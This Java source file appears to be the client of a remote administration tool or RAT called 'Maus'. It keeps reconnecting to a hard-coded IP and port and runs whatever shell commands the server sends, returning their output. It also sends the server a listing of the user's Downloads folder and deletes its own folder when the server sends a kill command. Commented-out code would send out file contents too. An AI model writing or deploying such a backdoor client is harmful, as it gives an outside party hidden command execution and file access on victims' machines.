package Client;

import Maus.Maus;

import java.io.*;
import java.net.Socket;
import java.net.URISyntaxException;

public class Client {
    private static String HOST = "141.219.247.21";
    private static int PORT = 22122;
    private BufferedOutputStream out;
    private Socket socket;


    private static String getHOST() {
        return HOST;
    }

    private static void setHOST(String HOST) {
        Client.HOST = HOST;
    }

    private static int getPORT() {
        return PORT;
    }

    private static void setPORT(int PORT) {
        Client.PORT = PORT;
    }

    public static void main(String[] args) throws InterruptedException {
        /* Load server settings and then attempt to connect to Maus. */
        Client client = new Client();
        client.loadServerSettings();
        client.connect();
    }

    private void connect() throws InterruptedException {
        try {
            socket = new Socket(getHOST(), getPORT());
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            out = new BufferedOutputStream(socket.getOutputStream());
            System.out.println("Client.Client started: " + getHOST() + ":" + getPORT());
            String comm;
            while ((comm = in.readLine()) != null && !comm.contains("forciblyclose")) {
                comm = in.readLine();
                if (comm.contains("CMD ")) {
                    System.out.println(comm);
                    exec(comm.replace("CMD ", ""));
                }
                if (comm.contains("FILELIST")){
                    communicate("FILELIST");
                    sendFileList();
                }
                if (comm.equals("forciblyclose")) {
                    communicate("forciblyclose");
                    String jarFolder = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()).getParentFile().getPath().replace('\\', '/');
                    File f = new File(jarFolder);
                    f.deleteOnExit();
                    System.exit(0);
                }
            }
        } catch (IOException e) {
            /* Continually retry connection until established. */
            System.out.println("Disconnected... retrying.");
            Thread.sleep(1200);
            connect();
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }


    /* Sends a message to the Server. */
    private void communicate(String msg) throws IOException {
        Writer writer = new OutputStreamWriter(out);
        writer.write(msg);
        writer.flush();
    }

    /* Execute a command using Java's Runtime. */
    private void exec(String command) throws IOException {
        if (!command.equals("")) {

            try {
                Process proc = Runtime.getRuntime().exec(command);
                BufferedReader reader =
                        new BufferedReader(new InputStreamReader(proc.getInputStream()));
                String line = "";
                while ((line = reader.readLine()) != null) {
                    System.out.print(line + "\n");
                    communicate(line);
                }
                communicate("end");
            } catch (IOException e) {
                e.printStackTrace();
                exec("");
            }

        }
    }

    private void loadServerSettings() {
        String path = Client.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        try (BufferedReader reader = new BufferedReader(new FileReader(new File( path + ".mauscs")))
        ) {
            String line;
            StringBuilder stringBuilder = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                stringBuilder.append(line);
            }
            String[] settings = stringBuilder.toString().split(" ");
            System.out.println(settings[0]);
            if (settings.length == 2) {
                setHOST(settings[0]);
                setPORT(Integer.parseInt(settings[1]));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendFileList() {
        try(       BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
                   DataOutputStream dos = new DataOutputStream(bos)){
            String directory = System.getProperty("user.home") + "/Downloads/";
            File[] files = new File(directory).listFiles();
            dos.writeUTF(directory);
            dos.writeInt(files.length);
            for (File file : files) {
                String name = file.getName();
                dos.writeUTF(name);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

//        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
//        DataOutputStream dos = new DataOutputStream(bos);
//
//        dos.writeInt(files.length);
//
//        for(File file : files){
//            Long length = file.length();
//            dos.writeLong(length);
//
//            String name = file.getName();
//            dos.writeUTF(name);
//
//            FileInputStream fis = new FileInputStream(file);
//            BufferedInputStream bis = new BufferedInputStream(fis);
//
//            int fbyte = 0;
//            while((fbyte = bis.read()) != -1) {
//                bos.write(fbyte);
//
//            }
//            bis.close();
//        }
//        dos.close();
    }
}
